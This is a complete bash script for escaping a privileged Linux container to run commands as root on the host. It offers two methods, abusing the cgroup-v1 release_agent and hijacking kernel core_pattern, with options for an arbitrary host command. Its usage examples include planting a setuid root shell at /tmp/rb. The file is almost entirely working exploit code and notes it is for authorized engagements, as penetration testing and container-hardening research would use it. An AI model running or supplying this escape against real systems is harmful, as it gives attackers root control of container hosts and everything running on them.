#!/usr/bin/env bash
# release_agent_escape.sh - Privileged-container escape via cgroup-v1 release_agent OR core_pattern.
#
# Requires CAP_SYS_ADMIN + the mount syscall (e.g. --privileged) for the release_agent method, or a
# writable /proc/sys/kernel/core_pattern for the core_pattern method. Both run the chosen command on
# the HOST as root, in the host init namespace.
#
# USAGE:
#   bash release_agent_escape.sh -c 'id > /output'                 # release_agent (default)
#   bash release_agent_escape.sh -m core_pattern -c 'id > /core_escape'
#   bash release_agent_escape.sh -m release_agent -c 'cp /bin/bash /tmp/rb; chmod 4755 /tmp/rb'
#
# Options:
#   -m <method>   release_agent (default) | core_pattern
#   -c <cmd>      shell command to execute on the host (default: 'ps -ef > /output; id >> /output')
#   -h            help
#
# Dependencies: mount, sed/awk, coreutils. cgroup-v1 only for release_agent (pure cgroup-v2 hosts
# have no release_agent -> use -m core_pattern or a runtime CVE). Authorized engagements only.
set -u
METHOD="release_agent"
CMD='ps -ef > /output; id >> /output'

usage() { sed -n '2,20p' "$0"; exit 0; }
while getopts "m:c:h" o; do
  case "$o" in
    m) METHOD="$OPTARG" ;;
    c) CMD="$OPTARG" ;;
    h|*) usage ;;
  esac
done

# Resolve THIS container's rootfs path as seen by the host kernel (overlay upperdir or mountinfo).
host_rootfs() {
  local up
  up=$(sed -n 's/.*\bupperdir=\([^,]*\).*/\1/p' /etc/mtab 2>/dev/null | head -n1)
  [ -z "$up" ] && up=$(sed -n 's/.*\bupperdir=\([^,]*\).*/\1/p' /proc/self/mountinfo 2>/dev/null | head -n1)
  # fall back to the merged root if upperdir is unknown
  [ -z "$up" ] && up=$(awk '$5=="/"{print $4}' /proc/self/mountinfo 2>/dev/null | head -n1)
  printf '%s' "$up"
}

escape_release_agent() {
  echo "[*] method=release_agent (cgroup-v1, needs CAP_SYS_ADMIN + mount)"
  local H; H=$(host_rootfs)
  if [ -z "$H" ]; then echo "[!] could not resolve host rootfs path; aborting"; exit 1; fi
  echo "[*] host-visible container rootfs: $H"

  mkdir -p /tmp/cgrp
  # try a couple of controllers; rdma/memory are commonly mountable
  if ! mount -t cgroup -o rdma cgroup /tmp/cgrp 2>/dev/null; then
    mount -t cgroup -o memory cgroup /tmp/cgrp 2>/dev/null || {
      echo "[!] cannot mount cgroup-v1 (host may be pure cgroup-v2). Try -m core_pattern."; exit 1; }
  fi
  mkdir -p /tmp/cgrp/x
  echo 1 > /tmp/cgrp/x/notify_on_release
  # release_agent must be an absolute HOST path; point it at a helper inside our rootfs.
  echo "$H/__ra_cmd" > /tmp/cgrp/release_agent
  cat > /__ra_cmd <<EOF
#!/bin/sh
$CMD
EOF
  chmod +x /__ra_cmd
  echo "[*] firing release_agent (join+exit empty cgroup) ..."
  sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
  sleep 1
  echo "[*] done. If your cmd wrote /output, here it is:"
  [ -f /output ] && cat /output
  echo "[*] cleanup: umount /tmp/cgrp; rm -f /__ra_cmd"
  umount /tmp/cgrp 2>/dev/null || true
}

escape_core_pattern() {
  echo "[*] method=core_pattern (needs writable /proc/sys/kernel/core_pattern)"
  if [ ! -w /proc/sys/kernel/core_pattern ]; then
    echo "[!] /proc/sys/kernel/core_pattern not writable; aborting"; exit 1; fi
  local H; H=$(host_rootfs)
  [ -z "$H" ] && { echo "[!] cannot resolve host rootfs path"; exit 1; }
  local SAVED; SAVED=$(cat /proc/sys/kernel/core_pattern)
  echo "[*] saved original core_pattern: $SAVED"
  cat > /__cp_handler <<EOF
#!/bin/sh
$CMD
EOF
  chmod +x /__cp_handler
  # '|' pipes the core dump to our program, run as ROOT in the host namespace on next crash.
  printf '|%s/__cp_handler' "$H" > /proc/sys/kernel/core_pattern
  echo "[*] core_pattern set -> $(cat /proc/sys/kernel/core_pattern)"
  echo "[*] triggering a crash to fire the handler ..."
  ulimit -c unlimited
  ( sh -c 'kill -SIGSEGV $$' ) 2>/dev/null || true
  sleep 1
  echo "[*] restoring core_pattern: $SAVED"
  printf '%s' "$SAVED" > /proc/sys/kernel/core_pattern 2>/dev/null || true
  echo "[*] done. Check the file your cmd wrote (e.g. /core_escape) and any host artifacts."
}

case "$METHOD" in
  release_agent) escape_release_agent ;;
  core_pattern)  escape_core_pattern ;;
  *) echo "[!] unknown method: $METHOD (use release_agent|core_pattern)"; exit 1 ;;
esac
